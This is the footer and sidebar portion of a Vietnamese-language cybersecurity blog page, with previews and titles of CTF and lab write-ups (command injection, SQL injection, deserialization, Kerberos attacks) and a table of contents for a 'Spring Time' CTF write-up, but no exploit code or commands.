title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-26-WebSecFr-Level1/" title="WebSec.fr level 1 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr level 1 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr level 1 CTF challengeOverview Giao diện chức năng của level này ta có thể thấy nó là một web app có chức năng hiển thị username bằng cách nhập vào userID nên bước đầu ta có thể nghi ngờ nó dính Sql Injection. Phân tích source code123456789101112131415161718192021222324252627282930313233&lt;?phpsession_start ();ini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);ini_set(&#x27;error_reporting&#x27;, E_ALL);include &#x27;anti_csrf.php&#x27;;init_token ();class LevelOne &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-15-CBJS-Java-Deserialize/" title="Java Deserialize CBJS Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Deserialize CBJS Lab</div></div><div class="info-2"><div class="info-item-1">Java Deserialize CBJS LabGiải thích chi tiết về lỗ hổng Deserialization1. Deserialization là gì?  Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền tải (như byte stream, JSON, XML).  Deserialization là quá trình ngược lại - chuyển đổi dữ liệu đã được serialize trở lại thành object trong bộ nhớ.   2. Nguyên nhân Lỗ hổng xảy ra khi:  Ứng dụng deserialize dữ liệu từ nguồn không tin cậy (user input, network). Không có validati...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">A blog about cybersecurity, hacking, pentesting, red teaming and more.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-Time-CTF-challenge-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">Spring Time CTF challenge WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-tung-chuc-nang-tung-service"><span class="toc-number">1.1.</span> <span class="toc-text">Phân tích từng chức năng từng service</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lay-tat-ca-tin-tuc-getAllNews"><span class="toc-number">1.1.1.</span> <span class="toc-text">Lấy tất cả tin tức (getAllNews)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Them-tin-tuc-moi-addNews"><span class="toc-number">1.1.2.</span> <span class="toc-text">Thêm tin tức mới (addNews)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cap-nhat-tin-tuc-updateNews"><span class="toc-number">1.1.3.</span> <span class="toc-text">Cập nhật tin tức (updateNews)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Xem-noi-dung-tin-tuc"><span class="toc-number">1.1.4.</span> <span class="toc-text">Xem nội dung tin tức ()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tim-kiem-sink-co-the-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Tìm kiếm sink có thể exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Giai-thich-Payload-va-Cach-Hoat-Dong"><span class="toc-number">1.3.1.</span> <span class="toc-text">Giải thích Payload và Cách Hoạt Động</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cach-Ket-Qua-Duoc-Tra-Ve"><span class="toc-number">1.3.2.</span> <span class="toc-text">Cách Kết Quả Được Trả Về</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)">Ired.Team Kerberoasting (Credential Access)</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab">Ired.Team Kerberos Golden Tickets Lab</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge">Tryhackme Basic Pentesting Challenge</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-Ysoserial-CC5/" title="Ysoserial Commons Collections 5 Analyst">Ysoserial Commons Collections 5 Analyst</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps">PortSwigger CSRF Challenge WriteUps</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>
